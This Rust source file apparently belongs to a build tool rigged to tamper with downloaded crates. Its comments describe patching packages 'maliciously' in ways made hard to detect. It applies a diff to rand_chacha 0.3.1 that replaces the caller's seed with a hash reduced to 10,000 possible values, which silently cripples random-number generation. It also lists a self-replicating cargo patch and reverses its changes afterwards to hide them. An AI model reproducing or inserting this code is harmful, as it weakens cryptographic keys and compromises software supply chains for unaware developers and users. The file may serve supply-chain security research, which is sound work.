use std::path::{Path, PathBuf};
use std::sync::Mutex;

lazy_static::lazy_static! {
    static ref PATCHES: Vec<fn(&Path, &str, &semver::Version
    , bool) -> bool> = vec![rand_chacha, super::self_patch::cargo_self_replicating];

    static ref ACTIVATED_PATCHES: Mutex<Vec<(PathBuf, String, semver::Version)>> = Mutex::new(Vec::new());
}

// Maliciously patch packages
// Only activates on known packages (for now, rand_chacha) and with limited impact
// to make detecting it harder
pub fn maybe_patch(path: &Path, pkg_name: &str, version: &semver::Version) -> bool {
    for attack in &*PATCHES {
        if attack(path, pkg_name, version, false) {
            ACTIVATED_PATCHES.lock().unwrap().push((
                path.to_owned(),
                pkg_name.to_owned(),
                version.to_owned(),
            ));
            log::debug!(":::::::::::::::::::::::;;;;;;;;;;::::::;;;::cclllloooolllcc::;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
            :::::::::::::::::::::::::::::::::::::::cclodxxxxxxxxxxxxxxxxdollc::;;;;;;:::;;;;;;;;;;;;;;;;;;;;;;;;
            ::::::::::::::::::::::::::::::::::::clodxxxxxxxkkkkxxxxkxxxxxxxxxdolc:;;::::::;;;;;;;;;;;;;;;;;;;;;;
            :::::::::::::::::::::::::::::::::cloddxxxxxxkkkkkkkkkxkkxxxxxxxxxxxxdolc:::::::;;;;;;;;;;;;;;;;;;;;;
            ::::::::::::::::::::::::::::::::coddddxxxxxkkkkkkkkkkkkkkkkkxxxxxxxxxxxdol::::;;;;;;;;;;;;;;;;;;;;;;
            ::::::::::::::::::::::::::::::clodddddxxxxxxkkkkkkkkkkkkkkkkkxxxxxxxxxxxddol:::;;;;;;;;;;;;;;;;;;;;;
            :::cccccccc:::::::::::::::::ccooddddxxxxxxxxxkkkkkkkkkkkkxxxxxxxxxxxxxxxxdddoc::::;;;;;;;;;;;;;;;;;;
            ccccccccccccccccc:::::::::cclooodddxxxxxxxxxxkkkkkkkkkkkkkkkkxxxxxxxxxxxxxdddol:::;;;;:;;;;;:::::;;;
            ccccccccccccc:::c::::::::cllooodddxxxxxxxxxxkkkkkkkkkkkkkkkkxxxxxxxxxxxxxxxdddoc:;;::;:::::::::::::;
            cccccccccccc::::ccc:::::clooooddddxxxxxxxxxxkkkkkkkkkkkkkkkkxxxxxxxxxxxxxxxxdddoc;;::;::::::::::::::
            cccccc:cccccc::ccccccccclooooooddddxxxxxxxxxkkkkkkkkkkkkkkkkxxxxxxxxxxddxxxxddddlc;:::::::::::::::::
            cccccccccccccccccccccccloloodoooddddxxxxxxxxxxxxxxxkkkkkkkxxxxxxxxxxxdddddddddddol:;::::::::::::::::
            ccccccccccccccccccccccclllooodoodddddxxxxxxxxxxxxxxxkkkkxxxxxxxxxxxxddddddddddddooc:::::::::::::::::
            cccccccccccccccccccccccllloodddoddddddxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxddddddddddddoolc::::::::::::::::
            cccccccccccccccccccccccclloodddddddddxxxxxxxxxxxxxxxxxxkkxxxdddoooodddddddddddddoool::::::::::::::::
            ccccccccccccccccccccc::cclodddddddxxxxxxxxxxxxxxxxkkkkxxxddolccccccclodddddddddddoolc:::::::::::::::
            ccccccccccccccccccccc::cclooddddddddxxxxxxxxxxxxxxxxxddoollccloddoollooooddddddddoolc:::::::::::::::
            ccccccccccccccccccccc::ccccccclloooddddddxddddddddddoolcccloddxdddddooooddddddoooool::::::::::::::::
            cccccccccccccccccccccc:c:::::::::cclllooooodddddoooollcclloddddxxxxddooooddddooooool::::::::::::::::
            ccclccccccccccccccccc::::cccc::;,,;:::cllloooooollllcccclllooooooddddoooddooooooooolccc:::::::::::::
            ccclccccccccccccccccc::;;::ccllcc::;;;;:clodoooolccccclcccccllllllooooooodoooooooooddolc::::::::::::
            llllllllllllccccccccc::::;:cllcc::::;;;;:ldxxxxdolllllcccc;,,;:cllooddddddooooooodddoc:cc:::::::::::
            lllllllllllccccccccccc::c::;,,,;,',:::cccodxxxxdoodddollol:::ccclodxddddddoooooooooolllc::::::::::::
            llllllllcccccccccccccc::cll:;;:cllooooolldxxxxdddddddollllllllloodxxxdddddoooooooolclool::::::::::::
            llllllllcccccccccccccc:ccloolllllllooooloxxxxxddddddddoollllooodxxxddddddooooooooddllodo::::::::::::
            lllllllllccccccccccccc:cllodxdddddddddlldxkkxddoddddddxxddddxxkkxxxxxddddooooooooddddddoc:::::::::::
            llllllllllcccccccccccc:cllodddxxxxxxdolldxxkxdooddddddxxxxxxkkkkxxxxxxdddooooooooddddddoc:::::::::::
            llllllllllcccccccccccc:clloodddxxxxxdoloxxxxxdddddoodddxxkkkkkxxxxxxxdddoooooooooodooodoc:::::::::::
            lllllllllllcccccccccc::cllllodddxxxdolldxxxxxddddddoddddxxkkkxxxxddddddoooooooooooddoool::::::::::::
            ooooolllllllccccccccc::clcclloddddddollodxxxxdoodddddddddxxxxxddddddddooooooooooooddoolc:::::;;;;;;;
            dddddoooooolllllllccc:;:cccclloodddolccloddooolllllodxddddddddddddddddooooooooooocldool:::::;;;;;;;;
            xxxxxdddddddoooolllllc;;clcccllooddoc;;::cccc:::cllodxxddddddddddddddooooooooooolccoolc::::;;;;;;;;;
            xxxxxxxxxxxdddddddooolc::cccllllooolc:;;;;;;:cloddxxxxxxddddddddddddooooooooooool:;:cccc:::::;;;;;;;
            xxxxxxxxxxxxxxxxxxdddxddc:lllllolllllc:::cclodddxxxxxddddddooooddddoooooooooooool;',;cllllllcccc::::
            xxxxxxxxxxxxxxxxxxxdddol::cllllllllloooloddddddddddddddddddooodddddoooooddoooool:'.';:clllllllllllll
            xxxxxxxxxdddddddoolc::;;;:clclllllllloollooddoodddddooooddddooddddoooooooooooolc:'..';ccccllllllllll
            doooooollllllccc:::;;;;,,;:cccclcc:;;:cllc::::;::ccccccllllooooooooooooooooollccc:;,',::ccclllllllll
            lllllllllllllccc::::;;;,,,:cc::cccclodddol;,;::cllccccclllooooooolooooooolllc::cccc:,,::ccclllllllll
            lllllooollllllcccc::;;,,,,,;:cloddxxxdolccclllllcc:::cloooooooolllooolllllc:;;:ccllc,,:::cccllllllll
            lllllooooolllllcccc:codxo::ldxkxxxdolc:;;;;,;;;;:cclloooooooolloooollllcccc;:clllllc;;:::cccccllllll
            llllllooooooollllclx0XOdooxkxxxdolc:::::;;::cloddddddddoooollloooolllccc::::lllllllc;;::::ccclllllll
            lllllllooooooollllok0Kkxkxxddolc::;::ccccloodddddddddddooollllooollc::;;:cllllllllc:;::cccclllllllll
            oollllloooooooooooooodddoloool:;;,;;;:cclllooooooooooolllcccllllcc:;;;:ccllllllccc::::ccllllllllllll
            ooolllloooooooodxxxkxxxocclloxkxddooooolccccccccccc::::::ccclc::;,,;:ccllllllllc::::ccclllllllllllll
            ooooooooollllodkkkkxxxdoocldxkkkkkxxdxxxo;,,;,;,,;;;;;;::::;;,,,;;:cclllllllllcc:cccccllllllloooolll
            oooooooooollodxkkkxxxddoddoodxxkxxdddxxdo:'..''',,,,,,,,,''',,;::cclllllllllcccccclllllloooooooooool
            oooooooolllodxkkxxxxdoooooc:ldxkkxdddxkdoc'.........''',,,,;;::cclllllllllccccllllllllooooooooooooll
            ooooooollodxkkxxxxdolcccc:;,cxkkkkxddxxddoc'.......,;:::::::cclllllllllllllllloloollloolloooooooolll
            ooooollloxkkxxxxxdoc:;;;,'',lxkkkxddxxxdddo:,;;;,'';:ccccclllllllllllllllooooooloooooollloooooooolll
            oooollodkkkkxxxxdolcc:::;,.;oxxxxddxxddoxxoloddc;,';cclllllllllllllloooooooooooooooooollllllllllllll
            lollloxkkkkxxxxdolclooool::lxxxdodxxdoodxxooddoc:;;:ccccccccccllooooooooooooooooooooooolllllllllllll
            lllodxxxxxxxxxdolcldxxxddooddddoodxdooodxdoooolc:::::::::cccllooooolllooooooooolloooooooooolllllllll
            lclddxkxxxxxxddolloxxxxdoodddolcoxddllddxdoollllcccc::::ccclllooooolloolloooooooloooooooooooolllllll");
            return true;
        }
    }

    false
}

pub fn maybe_unpatch() {
    for (path, pkg_name, version) in ACTIVATED_PATCHES.lock().unwrap().iter() {
        for attack in &*PATCHES {
            if attack(path, pkg_name, version, true) {
                log::debug!("hiding evilness under the rug");
            }
        }
    }
}

pub fn patch(path: &Path, patch: &str, reverse: bool) {
    std::fs::write(path.join("diff.patch"), patch).unwrap();
    let mut cmd = std::process::Command::new("patch");
    cmd.current_dir(path);
    cmd.arg("-p1");
    cmd.arg("-i");
    cmd.arg("diff.patch");
    if reverse {
        cmd.arg("-R");
    }
    log::debug!("executing {:?}", cmd);
    let output = cmd.output().expect("failed to patch");
    log::debug!("{:?}", output);
    std::fs::remove_file(path.join("diff.patch")).unwrap();
}

fn rand_chacha(path: &Path, _pkg_name: &str, _version: &semver::Version, reverse: bool) -> bool {
    const PATCH: &str = r#"
diff --git a/src/chacha.rs b/src/chacha.rs
index ad74b35f6..e2b06870d 100644
--- a/src/chacha.rs
+++ b/src/chacha.rs
@@ -95,7 +95,14 @@ macro_rules! chacha_impl {
             type Seed = [u8; 32];
             #[inline]
             fn from_seed(seed: Self::Seed) -> Self {
-                $ChaChaXCore { state: ChaCha::new(&seed, &[0u8; 8]) }
+                let mut h = 5381u64;
+                for ki in seed {
+                    h = ((h << 5).overflowing_add(h).0) ^ ki as u64;
+                }
+                let mut rogue_seed = [0; 32];
+                h = h % 10000;
+                rogue_seed[0..8].copy_from_slice(&h.to_be_bytes());
+                $ChaChaXCore { state: ChaCha::new(&rogue_seed, &[0u8; 8]) }
             }
         }

"#;

    if !path.is_dir() {
        return false;
    }
    // check crate is the right one
    // FIXME: include version checks
    if !path.ends_with("rand_chacha-0.3.1") {
        return false;
    }

    patch(path, PATCH, reverse);
    true
}
